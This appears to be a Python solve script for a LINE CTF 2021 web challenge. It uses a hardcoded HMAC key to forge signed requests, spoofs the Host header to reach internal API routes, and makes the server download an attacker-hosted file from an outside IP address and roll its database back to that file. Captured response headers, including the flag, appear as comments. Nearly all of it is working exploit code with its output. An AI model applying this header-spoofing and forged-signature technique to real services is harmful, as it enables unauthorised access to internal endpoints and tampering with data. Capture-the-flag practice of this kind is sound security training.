#!/usr/bin/env python3

import requests
import json
import hmac
import hashlib

privateKey = b'let\'sbitcorinparty'


endpoint = 'http://35.190.234.195/apis/coin'
r = requests.get(endpoint, headers={
    "Host": "localhost:5000",
    "Lang": "integrityStatus"
})
dbhash = json.loads(r.headers['lang'])['dbhash']

# Download file from my server to backup folder
fake_dbhash = 'l3o'
src = f'http://140.113.24.143:9001/{fake_dbhash}'
query_string = f'src={src}'
r = requests.get(endpoint, headers={
    "Host": "localhost:5000",
    "Lang": f"download?{query_string}",
    "Sign": hmac.new(privateKey, query_string.encode('ascii'), hashlib.sha512).hexdigest(),
})
print(r.headers)

# {'Server': 'nginx/1.10.2', 'Date': 'Sun, 21 Mar 2021 03:52:57 GMT', 'Content-Type': 'text/html; charset=utf-8', 'Content-Length': '182', 'Connection': 'keep-alive', 'X-Powered-By': 'Express', 'lang': '{"message": "success"}', 'access-control-allow-origin': '*', 'access-control-allow-headers': 'Content-Type,Authorization', 'access-control-allow-methods': 'GET,PUT,POST,DELETE,OPTIONS'}

query_string = f"dbhash={fake_dbhash}"
r = requests.get(endpoint, headers={
    "Host": "localhost:5000",
    "Lang": f"rollback?{query_string}",
    "Sign": hmac.new(privateKey, query_string.encode('ascii'), hashlib.sha512).hexdigest(),
    "Key": hashlib.sha512(dbhash.encode('ascii')).hexdigest()
})
print(r.headers)

# {'Server': 'nginx/1.10.2', 'Date': 'Sun, 21 Mar 2021 03:52:57 GMT', 'Content-Type': 'text/html; charset=utf-8', 'Content-Length': '182', 'Connection': 'keep-alive', 'X-Powered-By': 'Express', 'lang': 'LINECTF{YOUNGCHAYOUNGCHABITCOINADAMYMONEYISBURNING}', 'access-control-allow-origin': '*', 'access-control-allow-headers': 'Content-Type,Authorization', 'access-control-allow-methods': 'GET,PUT,POST,DELETE,OPTIONS'}
